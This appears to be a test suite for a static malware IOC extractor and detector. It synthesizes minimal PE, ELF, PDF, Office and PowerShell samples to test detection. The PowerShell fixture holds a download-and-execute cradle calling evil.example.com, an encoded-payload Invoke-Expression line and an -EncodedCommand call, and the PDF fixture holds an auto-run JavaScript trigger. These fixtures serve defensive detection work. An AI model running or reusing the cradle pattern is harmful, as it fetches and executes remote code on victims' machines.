"""
Tests for StaticIOCExtractor.

Synthesizes minimal valid samples for each format and verifies the
extractor produces sensible structured output. No real malware
samples are used.
"""
from __future__ import annotations
import io
import struct
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

# Make the package importable regardless of where the test is run
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from . import StaticFeatureExtractor
from StaticFeatureExtractor import (
    extract,
    FileFormat,
    IOCExtractionPipeline,
    EnsembleDetector,
    HeuristicDetector,
    HeuristicFeatureModel,
    ember2024_download_plan,
    feature_tokens,
)


# ──────────────────────────────────────────────────────────────────────
#  Helpers — synthesize minimal valid samples
# ──────────────────────────────────────────────────────────────────────

def make_minimal_pe() -> bytes:
    """
    Hand-assemble a minimal PE32+ file. Two sections (.text + .data),
    no imports, no resources. LIEF accepts it.

    Layout:
        DOS header (64 bytes) → PE signature → COFF header
        → optional header → 2 section headers → section data
    """
    # ── DOS header ──
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    pe_offset = 0x80
    struct.pack_into("<I", dos, 0x3c, pe_offset)
    # Pad up to PE offset
    pre_pe = bytes(dos) + b"\x00" * (pe_offset - 64)

    # ── PE signature + COFF header ──
    pe_sig = b"PE\x00\x00"
    machine = 0x8664                  # IMAGE_FILE_MACHINE_AMD64
    n_sections = 2
    timestamp = 0x60000000
    sym_ptr = 0
    n_syms = 0
    opt_hdr_size = 240                # PE32+ optional header
    chars = 0x0022                    # EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    coff = struct.pack("<HHIIIHH",
                       machine, n_sections, timestamp,
                       sym_ptr, n_syms, opt_hdr_size, chars)

    # ── Optional header (PE32+, 240 bytes) ──
    opt = bytearray(opt_hdr_size)
    struct.pack_into("<H", opt, 0, 0x20b)        # Magic = PE32+
    opt[2] = 14                                   # MajorLinkerVersion
    opt[3] = 0
    struct.pack_into("<I", opt, 4, 0x200)         # SizeOfCode
    struct.pack_into("<I", opt, 8, 0x200)         # SizeOfInitializedData
    struct.pack_into("<I", opt, 16, 0x1000)       # AddressOfEntryPoint
    struct.pack_into("<I", opt, 20, 0x1000)       # BaseOfCode
    struct.pack_into("<Q", opt, 24, 0x140000000)  # ImageBase
    struct.pack_into("<I", opt, 32, 0x1000)       # SectionAlignment
    struct.pack_into("<I", opt, 36, 0x200)        # FileAlignment
    struct.pack_into("<H", opt, 40, 6)            # MajorOSVersion
    struct.pack_into("<H", opt, 48, 6)            # MajorSubsystemVersion
    struct.pack_into("<I", opt, 56, 0x4000)       # SizeOfImage
    struct.pack_into("<I", opt, 60, 0x400)        # SizeOfHeaders
    struct.pack_into("<H", opt, 68, 3)            # Subsystem = CONSOLE
    struct.pack_into("<Q", opt, 72, 0x100000)     # SizeOfStackReserve
    struct.pack_into("<Q", opt, 80, 0x1000)       # SizeOfStackCommit
    struct.pack_into("<Q", opt, 88, 0x100000)     # SizeOfHeapReserve
    struct.pack_into("<Q", opt, 96, 0x1000)       # SizeOfHeapCommit
    struct.pack_into("<I", opt, 108, 16)          # NumberOfRvaAndSizes
    # Data directories left as zeros

    # ── Section headers (40 bytes each) ──
    def section_header(name: bytes, vsize: int, vaddr: int,
                        rsize: int, raddr: int, chars: int) -> bytes:
        return (
            name.ljust(8, b"\x00") +
            struct.pack("<IIII", vsize, vaddr, rsize, raddr) +
            struct.pack("<IIHHI", 0, 0, 0, 0, chars)
        )

    text_chars = 0x60000020   # CODE | EXECUTE | READ
    data_chars = 0xC0000040   # INITIALIZED_DATA | READ | WRITE

    sec1 = section_header(b".text", 0x200, 0x1000, 0x200, 0x400, text_chars)
    sec2 = section_header(b".data", 0x200, 0x2000, 0x200, 0x600, data_chars)

    # ── Assemble headers + section data ──
    headers = pre_pe + pe_sig + coff + bytes(opt) + sec1 + sec2
    headers = headers.ljust(0x400, b"\x00")        # pad to FileAlignment

    # .text content: high-entropy random-looking bytes
    text_content = bytes(range(256)) * 2           # 512 bytes
    # .data content: low-entropy
    data_content = (b"Hello World\x00" * 32).ljust(0x200, b"\x00")[:0x200]

    return headers + text_content + data_content


def make_minimal_elf() -> bytes:
    """
    Build a minimal ELF64 executable header. Not fully linkable, but
    LIEF will parse the header and we can verify ELF detection +
    header extraction.
    """
    # ELF magic + class (64) + endian (LE) + version + ABI
    e_ident = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
    e_type = struct.pack("<H", 2)         # ET_EXEC
    e_machine = struct.pack("<H", 0x3e)   # EM_X86_64
    e_version = struct.pack("<I", 1)
    e_entry = struct.pack("<Q", 0x400000)
    e_phoff = struct.pack("<Q", 64)
    e_shoff = struct.pack("<Q", 0)
    e_flags = struct.pack("<I", 0)
    e_ehsize = struct.pack("<H", 64)
    e_phentsize = struct.pack("<H", 56)
    e_phnum = struct.pack("<H", 0)
    e_shentsize = struct.pack("<H", 64)
    e_shnum = struct.pack("<H", 0)
    e_shstrndx = struct.pack("<H", 0)
    return (e_ident + e_type + e_machine + e_version +
            e_entry + e_phoff + e_shoff + e_flags +
            e_ehsize + e_phentsize + e_phnum +
            e_shentsize + e_shnum + e_shstrndx +
            b"\x00" * 1024)


def make_powershell_script() -> bytes:
    """A PowerShell script with some classic suspicious patterns."""
    code = (
        "param($url)\n"
        "$wc = New-Object Net.WebClient\n"
        "$payload = $wc.DownloadString('http://evil.example.com/x.ps1')\n"
        "Invoke-Expression $payload\n"
        "$encoded = 'VGhpcyBpcyBhIHRlc3Qgc3RyaW5nIGZvciBkZXRlY3Rpb24gb2YgYmFzZTY0IGJsb2JzIGluIHRoaXMgaGV1cmlzdGljLg=='\n"
        "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)))\n"
        "powershell.exe -EncodedCommand " + "QQA" * 60 + "\n"
    )
    return code.encode("utf-8")


def make_minimal_pdf_with_js() -> bytes:
    """A tiny PDF with /JavaScript and /OpenAction triggers."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n"
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/OpenAction << /S /JavaScript /JS (app.alert('test');) >> "
        b">>\n"
        b"endobj\n"
        b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        b"xref\n0 4\n0000000000 65535 f\n"
        b"trailer\n<< /Size 4 /Root 1 0 R >>\n"
        b"startxref\n300\n%%EOF\n"
    )


def make_ooxml_stub() -> bytes:
    """A minimal OOXML zip — Office detection should trigger."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types/>')
        z.writestr("word/document.xml",
                   '<?xml version="1.0"?><w:document/>')
    return buf.getvalue()


# ──────────────────────────────────────────────────────────────────────
#  Tests
# ──────────────────────────────────────────────────────────────────────

class TestPEExtraction(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
        self.tmp.write(make_minimal_pe())
        self.tmp.close()
        self.path = Path(self.tmp.name)

    def tearDown(self):
        self.path.unlink(missing_ok=True)

    def test_extracts_pe_format(self):
        f = extract(self.path)
        self.assertEqual(f.file_type.detected_format, FileFormat.PE)

    def test_hashes_present(self):
        f = extract(self.path)
        self.assertEqual(len(f.hashes.md5), 32)
        self.assertEqual(len(f.hashes.sha1), 40)
        self.assertEqual(len(f.hashes.sha256), 64)

    def test_pe_sections_extracted(self):
        f = extract(self.path)
        section_names = {s.name for s in f.pe_sections}
        self.assertIn(".text", section_names)
        # Each section should have entropy and md5
        for sec in f.pe_sections:
            self.assertGreaterEqual(sec.entropy, 0.0)
            self.assertLessEqual(sec.entropy, 8.0)
            self.assertEqual(len(sec.md5), 32)

    def test_pe_header_extracted(self):
        f = extract(self.path)
        self.assertIsNotNone(f.pe_header)
        self.assertGreater(f.pe_header.n_sections, 0)

    def test_byte_features_present(self):
        f = extract(self.path)
        self.assertIsNotNone(f.byte_stats)
        self.assertEqual(len(f.byte_stats.histogram), 256)
        self.assertEqual(len(f.byte_stats.byte_entropy_histogram), 256)

    def test_to_iocs_includes_section_features(self):
        f = extract(self.path)
        iocs = f.to_iocs()
        ioc_types = {i["type"] for i in iocs}
        self.assertIn("MD5", ioc_types)
        self.assertIn("SHA-256", ioc_types)
        self.assertIn("PE.SECTION.NAME", ioc_types)
        self.assertIn("PE.SECTION.ENTROPY", ioc_types)

    def test_yara_conditions_emit(self):
        f = extract(self.path)
        conds = f.to_yara_conditions()
        # PE conditions should include the structural invariants. SHA-256
        # is deliberately NOT emitted here — it's a fingerprint that
        # belongs in the meta block, not a hunting condition.
        self.assertTrue(any("number_of_sections" in c for c in conds))
        # Should not contain a self-referential hash condition
        self.assertFalse(any("hash.sha256(0, filesize)" in c for c in conds))


class TestELFExtraction(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".elf", delete=False)
        self.tmp.write(make_minimal_elf())
        self.tmp.close()
        self.path = Path(self.tmp.name)

    def tearDown(self):
        self.path.unlink(missing_ok=True)

    def test_format_detected(self):
        f = extract(self.path)
        self.assertEqual(f.file_type.detected_format, FileFormat.ELF)

    def test_elf_header_extracted(self):
        f = extract(self.path)
        # LIEF may or may not parse our minimal ELF; we tolerate both
        # but the format detection must succeed regardless
        self.assertEqual(f.file_type.detected_format, FileFormat.ELF)


class TestScriptExtraction(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".ps1", delete=False)
        self.tmp.write(make_powershell_script())
        self.tmp.close()
        self.path = Path(self.tmp.name)

    def tearDown(self):
        self.path.unlink(missing_ok=True)

    def test_script_features(self):
        f = extract(self.path)
        self.assertIsNotNone(f.script)
        self.assertEqual(f.script.language, "powershell")
        self.assertGreater(len(f.script.suspicious_keywords), 0)
        self.assertIn("Net.WebClient", f.script.suspicious_keywords)
        self.assertGreater(len(f.script.urls), 0)
        # Base64 blob detection
        self.assertGreater(len(f.script.base64_blobs), 0)
        # PowerShell flag detection
        self.assertGreater(len(f.script.powershell_flags), 0)


class TestPDFExtraction(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".pdf", delete=False)
        self.tmp.write(make_minimal_pdf_with_js())
        self.tmp.close()
        self.path = Path(self.tmp.name)

    def tearDown(self):
        self.path.unlink(missing_ok=True)

    def test_pdf_features(self):
        f = extract(self.path)
        self.assertEqual(f.file_type.detected_format, FileFormat.PDF)
        self.assertIsNotNone(f.pdf)
        # Either pikepdf or the regex fallback should catch /JavaScript
        self.assertTrue(f.pdf.has_javascript)
        self.assertTrue(f.pdf.has_openaction)


class TestOfficeExtraction(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile(suffix=".docx", delete=False)
        self.tmp.write(make_ooxml_stub())
        self.tmp.close()
        self.path = Path(self.tmp.name)

    def tearDown(self):
        self.path.unlink(missing_ok=True)

    def test_office_detected(self):
        f = extract(self.path)
        # Magika should classify it as docx/zip; format detection should
        # land on OFFICE
        self.assertIn(f.file_type.detected_format,
                       (FileFormat.OFFICE, FileFormat.UNKNOWN))


class TestFeatureModel(unittest.TestCase):
    def test_feature_tokens_include_script_behavior(self):
        tmp = tempfile.NamedTemporaryFile(suffix=".ps1", delete=False)
        tmp.write(make_powershell_script())
        tmp.close()
        try:
            features = extract(tmp.name)
            tokens = feature_tokens(features)
            self.assertIn("script.language:powershell", tokens)
            self.assertTrue(any(t.startswith("script.keyword:") for t in tokens))
            self.assertTrue(any(t.startswith("script.url.host:") for t in tokens))
        finally:
            Path(tmp.name).unlink(missing_ok=True)

    def test_heuristic_feature_model_flags_suspicious_script_when_sensitive(self):
        tmp = tempfile.NamedTemporaryFile(suffix=".ps1", delete=False)
        tmp.write(make_powershell_script())
        tmp.close()
        try:
            features = extract(tmp.name)
            assessment = HeuristicFeatureModel(threshold=0.35).assess(features)
            self.assertTrue(assessment.is_likely_malware)
            self.assertGreater(len(assessment.selected_features), 0)
            self.assertIn("malware_like", assessment.verdict)
        finally:
            Path(tmp.name).unlink(missing_ok=True)


class TestEmber2024Helpers(unittest.TestCase):
    def test_download_plan_estimates_pe_train_size(self):
        plan = ember2024_download_plan("/tmp/ember2024", split="train", file_type="PE")
        self.assertEqual(plan.expanded_file_types, ["Win32", "Win64", "Dot_Net"])
        self.assertEqual(plan.expanded_splits, ["train"])
        self.assertEqual(plan.estimated_size, "38.4 GB")


class TestPipeline(unittest.TestCase):
    def test_pipeline_on_benign_pe(self):
        # A minimal PE has no suspicious features → heuristic-only ensemble
        # should call it benign
        tmp = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
        tmp.write(make_minimal_pe())
        tmp.close()
        try:
            pipeline = IOCExtractionPipeline(
                detector=EnsembleDetector(
                    [(HeuristicDetector(), 1.0)],
                    threshold=0.5,
                ),
            )
            result = pipeline.analyze(tmp.name)
            self.assertEqual(result.verdict, "benign")
            self.assertIsNotNone(result.features)
            self.assertIsNotNone(result.feature_assessment)
            self.assertFalse(result.feature_assessment.is_likely_malware)
            # Layer 2 should not have run
            self.assertIsNone(result.autopyara_rule)
            self.assertIsNone(result.composed_rule)
        finally:
            Path(tmp.name).unlink(missing_ok=True)

    def test_pipeline_force_runs_all_layers(self):
        # Force=True bypasses the gate
        tmp = tempfile.NamedTemporaryFile(suffix=".ps1", delete=False)
        tmp.write(make_powershell_script())
        tmp.close()
        try:
            # Mock AutoPYara to avoid the real dependency
            class _MockAutoPYara:
                def generate(self, **kwargs):
                    return {
                        "k_clusters": 1,
                        "rule_string": (
                            f"rule {kwargs['rule_name']} {{\n"
                            "    strings:\n"
                            "        $hex_0 = { 41 42 43 }\n"
                            "    condition:\n"
                            "        any of them\n"
                            "}\n"
                        ),
                    }
            pipeline = IOCExtractionPipeline(
                detector=EnsembleDetector(
                    [(HeuristicDetector(), 1.0)],
                    threshold=0.5,
                ),
                autopyara_factory=_MockAutoPYara,
            )
            result = pipeline.analyze(tmp.name, force=True,
                                       rule_name="test_rule")
            self.assertEqual(result.verdict, "forced")
            self.assertIsNotNone(result.feature_assessment)
            self.assertIsNotNone(result.composed_rule)
            self.assertIn("test_rule", result.composed_rule)
            self.assertIn("strings:", result.composed_rule)
            self.assertIn("condition:", result.composed_rule)
        finally:
            Path(tmp.name).unlink(missing_ok=True)

    def test_pipeline_handles_nonexistent_file(self):
        pipeline = IOCExtractionPipeline(
            detector=EnsembleDetector([(HeuristicDetector(), 1.0)]),
        )
        result = pipeline.analyze("/nonexistent/path.exe")
        self.assertEqual(result.verdict, "error")
        self.assertTrue(any("extraction failed" in e for e in result.errors))


class TestRobustness(unittest.TestCase):
    def test_corrupt_file_does_not_crash(self):
        tmp = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
        tmp.write(b"MZ" + b"\x00" * 100 + b"corrupted garbage")
        tmp.close()
        try:
            f = extract(tmp.name)
            # Hashes always succeed even on garbage
            self.assertEqual(len(f.hashes.sha256), 64)
            # parse_errors should be populated
            # (or the format is UNKNOWN — both are acceptable)
        finally:
            Path(tmp.name).unlink(missing_ok=True)

    def test_empty_file(self):
        tmp = tempfile.NamedTemporaryFile(delete=False)
        tmp.close()
        try:
            f = extract(tmp.name)
            self.assertEqual(f.file_type.file_size, 0)
            # MD5 of empty file is the well-known constant
            self.assertEqual(f.hashes.md5, "d41d8cd98f00b204e9800998ecf8427e")
        finally:
            Path(tmp.name).unlink(missing_ok=True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
